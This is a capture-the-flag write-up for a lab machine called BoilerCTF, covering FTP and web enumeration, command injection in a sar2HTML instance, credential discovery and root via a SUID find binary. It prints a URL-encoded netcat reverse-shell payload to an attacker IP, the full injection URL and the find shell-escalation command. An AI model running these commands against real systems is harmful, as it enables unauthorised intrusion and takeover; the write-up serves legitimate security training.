BoilerCTF

Target IP: 10.10.161.76

Scanning



There are four TCP ports open on the target machine. Two of these ports are HTTP, one SSH, and FTP.

Enumeration

Port 21: FTP

The FTP application allows anonymous login. There is one file called .info.txt which contains Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!. This looks encrypted.


But decrypting this using Caesar Cipher with +13 as the key leads to the message above. Time to enumerate other ports now.

Port 80: HTTP
The default webpage is the Apache page.


Doing a directory search shows a directory called /joomla exists.


I performed more search on the /joomla and obtained the result above. There are interesting pages. The first URL mentions the version and name of the joomla application which is 3.6.


The /robots.txt page is interesting. There are a few directories. I am wondering what the numbers mean at the bottom.


After performing a directory search against /joomla using the command gobuster dir -u http://10.10.161.76/joomla/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt, I obtained the result above.


After falling into many rabbit hole trying to decode useless strings, I managed to find something interesting. It is sar2HTML application located at http://10.10.161.76/joomla/_test.I know this application is vulnerable to command injection. Time to exploit this vulnerablilty.

Exploitation


Exploiting this vulnerability is super simple. The webpage above is the normal webpage before exploitation. After pressing the button NEW on the left, a new parameter called plot gets appended at the URL.


We can inject our commands directly using the plot paramter. For example, after the equal, we can put a semicolon, and then inject our commands! After injecting the commands, the output is shown after clicking the Select Host button on the left as shown above. By using this same method, it is possible to gain a reverse shell connection by injecting our reverse shell script using the plot parameter.


And I gained a reverse shell connection back from the remote host.
Payload used: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff
Full URL with payload: http://10.10.161.76/joomla/_test/index.php?plot=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff

Privilege Escalation


After landing the shell, I notice a file called log.txt. I found basterd:superduperp@$$ credentials.


Using the credentials basterd:superduperp@$$, I managed to gain access to SSH as basterd.


After upgrading my shell to an interactive Python shell, I found another file called backup.sh. Yet again, is this another credentials of a user called stoner with the password superduperp@$$no1knows?


And this worked too! Now I am stoner. Looks like this user is in the group lxd, which we can exploit to gain root. But I wish to enumerate further.


Looks like we can elevate our privileges using /usr/bin/find.


And now I am root by using the command ./find . -exec /bin/sh -p \; -quit.

Flags


The user.txt flag once I obtained the password of stoner and switched to this user.


The root.txt flag once I elevated my privileges using find binary.
